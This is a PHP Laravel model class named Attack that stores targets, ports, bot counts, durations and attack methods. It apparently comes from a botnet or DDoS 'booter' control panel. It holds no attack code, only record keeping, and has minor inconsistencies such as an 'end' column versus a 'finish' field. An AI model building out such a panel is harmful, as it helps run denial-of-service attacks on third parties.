<?php

namespace App;

use Illuminate\Database\Eloquent\Model;
use App\Bot;

class Attack extends Model
{
  /**
  * The attributes that are mass assignable.
  *
  * @var array
  */
  protected $fillable = ['name', 'target', 'port', 'start', 'finish', 'bots_number', 'duration'];


  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeWaiting($query)
  {
    return $query->whereNull('start');
  }

  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeRunning($query)
  {
    return $query->whereNotNull('start')->whereNull('end');
  }

  /**
  * Scope a query to get only currently connected bots.
  *
  * @param \Illuminate\Database\Eloquent\Builder $query
  * @return \Illuminate\Database\Eloquent\Builder
  */
  public function scopeFinnished($query)
  {
    return $query->whereNotNull('start')->whereNotNull('end');
  }

  public function bots()
  {
    return $this->hasMany('App\Bot');
  }

  /**
  * Get the user that create the attack.
  *
  * @return App\User;
  */
  public function user() {

   return $this->belongsTo('App\User');

  }

  /**
  * Get the attack's method.
  *
  * @return App\Method;
  */
  public function method() {

   return $this->belongsTo('App\Method');

  }
}
